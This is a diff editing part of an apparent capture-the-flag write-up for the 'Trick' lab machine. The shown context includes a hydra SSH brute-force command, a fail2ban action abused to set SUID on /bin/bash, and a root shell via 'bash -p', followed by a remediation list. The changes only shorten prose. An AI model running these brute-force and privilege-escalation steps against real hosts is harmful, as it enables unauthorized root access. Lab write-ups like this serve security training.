@@ -356,7 +356,7 @@ michael@trick:~$ sudo /etc/init.d/fail2ban restart
 [ ok ] Restarting fail2ban (via systemctl): fail2ban.service.
 ```
 
-To actually trigger the "ban" event (and therefore the malicious `actionban` command), the `sshd` jail needs to see enough failed login attempts from a single source to cross its threshold. A brute-force flood against SSH is used purely to generate that volume of failures — the credentials themselves are irrelevant:
+To actually trigger the "ban" event (and therefore the malicious `actionban` command), the `sshd` jail needs to see enough failed login attempts from a single source to cross its threshold. A brute-force flood against SSH is used to generate that volume of failures:
 
 ```
 hydra 10.129.137.188 ssh -l root -P /usr/share/wordlists/rockyou.txt
@@ -369,7 +369,7 @@ michael@trick:~$ ls -la /bin/bash
 -rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
 ```
 
-The `s` in the permission bits confirms the SUID bit is now set on `/bin/bash`. Invoking bash with `-p` (preserve privileges) yields a root-owned effective UID:
+The `s` in the permission bits confirms the SUID bit is now set on `/bin/bash`. Invoking bash with `-p` (preserve privileges) grants a root-owned effective UID:
 
 ```
 michael@trick:~$ /bin/bash -p
@@ -392,11 +392,11 @@ bash-5.0# cat /root/root.txt
 
 - **Unrestricted DNS zone transfer (AXFR):** Restrict zone transfers to explicitly authorized secondary nameservers (`allow-transfer` in BIND) and never allow AXFR from arbitrary clients. Zone data should not be treated as a source of "hidden" subdomains.
 - **SQL injection in the payroll login form:** Use parameterized queries / prepared statements for all database access. Never build SQL strings by concatenating unsanitized user input.
-- **Excessive database privileges:** The application's MySQL account should never have been granted the `FILE` privilege. Scope database accounts to the minimum privileges required (`SELECT`/`INSERT`/`UPDATE` on specific application tables only) and disable `FILE`/`SUPER` for web-facing accounts.
+- **Excessive database privileges:** Scope database accounts to the minimum privileges required (`SELECT`/`INSERT`/`UPDATE` on specific application tables only) and disable `FILE`/`SUPER` for web-facing accounts.
 - **Sensitive configuration disclosure:** Restrict filesystem permissions so that the MySQL service account cannot read files like `/etc/nginx/nginx.conf` or other configuration outside its own data directory.
-- **Local file inclusion / path traversal in the marketing site:** Never resolve a user-supplied `page` parameter directly against the filesystem. Use a strict allow-list of valid page identifiers mapped internally to fixed file paths.
-- **Private key readable via a web-facing PHP process:** `michael`'s SSH private key should never have been reachable by the web server user. Restrict `~/.ssh` permissions to `700`/`600` and ensure no other account or process (including PHP-FPM pools) can read it.
-- **Overly permissive `sudo` rule:** Granting `NOPASSWD` control over service restarts is dangerous when the service's own configuration is writable by the same user (directly or via group membership). Ensure any user permitted to restart a privileged service cannot also modify what that service executes.
+- **Local file inclusion / path traversal in the marketing site:** Use a strict allow-list of valid page identifiers mapped internally to fixed file paths.
+- **Private key readable via a web-facing PHP process:**  Restrict `~/.ssh` permissions to `700`/`600` and ensure no other account or process (including PHP-FPM pools) can read it.
+- **Overly permissive `sudo` rule:** Ensure any user permitted to restart a privileged service cannot also modify what that service executes.
 - **Group-writable fail2ban `action.d` directory:** Action definitions executed by fail2ban run with the privileges of the fail2ban service (root). This directory must be writable only by `root`; membership in a group with write access to it is equivalent to arbitrary root code execution the next time fail2ban reloads and triggers an action.
 
 ---
